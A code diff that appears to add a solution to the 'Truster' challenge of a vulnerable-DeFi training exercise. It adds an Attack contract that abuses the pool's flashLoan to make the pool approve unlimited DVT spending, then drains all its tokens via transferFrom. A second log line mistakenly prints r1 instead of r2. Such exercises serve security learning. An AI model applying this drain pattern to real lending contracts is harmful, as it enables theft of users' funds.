@@ -41,7 +41,13 @@ contract Truster is Test {
         /**
          * EXPLOIT START *
          */
+        vm.startPrank(attacker);
 
+        new Attack(address(trusterLenderPool), address(dvt));
+        //trusterLenderPool.flashLoan(0, attacker, address(dvt), abi.encodeWithSignature("approve(address,uint256)", address(this), type(uint256).max));
+        //dvt.transferFrom(address(trusterLenderPool), attacker, 1e24);
+
+        vm.stopPrank();
         /**
          * EXPLOIT END *
          */
@@ -53,5 +59,19 @@ contract Truster is Test {
         // Attacker has taken all tokens from the pool
         assertEq(dvt.balanceOf(address(trusterLenderPool)), 0);
         assertEq(dvt.balanceOf(address(attacker)), TOKENS_IN_POOL);
+    }
+}
+
+contract Attack {
+    constructor(address pool, address dvt) { 
+        (bool r1, ) = pool.call(
+            abi.encodeWithSignature("flashLoan(uint256,address,address,bytes)", 0, address(this), dvt, 
+                abi.encodeWithSignature("approve(address,uint256)", address(this), type(uint256).max)));
+        
+        console.log("malicious flashloan request: %s", r1);
+
+        (bool r2, ) = dvt.call(abi.encodeWithSignature("transferFrom(address,address,uint256)", pool, msg.sender, 1e24));
+
+        console.log("malicious dvt transfer request: %s", r1);
     }
 }
